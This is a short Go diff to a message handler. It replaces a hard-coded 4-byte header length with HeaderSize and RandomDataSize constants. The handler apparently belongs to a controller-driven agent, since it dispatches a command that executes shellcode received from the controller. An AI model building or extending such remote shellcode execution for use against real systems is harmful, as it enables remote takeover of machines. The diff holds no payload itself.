@@ -90,13 +90,13 @@ func (h *handler) logPanic(title string) {
 // must copy it, because answer is from sync.Pool.
 func (h *handler) OnMessage(answer *protocol.Answer) {
 	defer h.logPanic("handler.OnMessage")
-	if len(answer.Message) < 4 {
+	if len(answer.Message) < messages.HeaderSize {
 		const log = "controller send with invalid size"
 		h.logWithInfo(logger.Exploit, answer, log)
 		return
 	}
-	msgType := convert.BytesToUint32(answer.Message[:4])
-	answer.Message = answer.Message[4:]
+	msgType := convert.BytesToUint32(answer.Message[messages.RandomDataSize:messages.HeaderSize])
+	answer.Message = answer.Message[messages.HeaderSize:]
 	switch msgType {
 	case messages.CMDExecuteShellCode:
 		h.handleExecuteShellCode(answer)
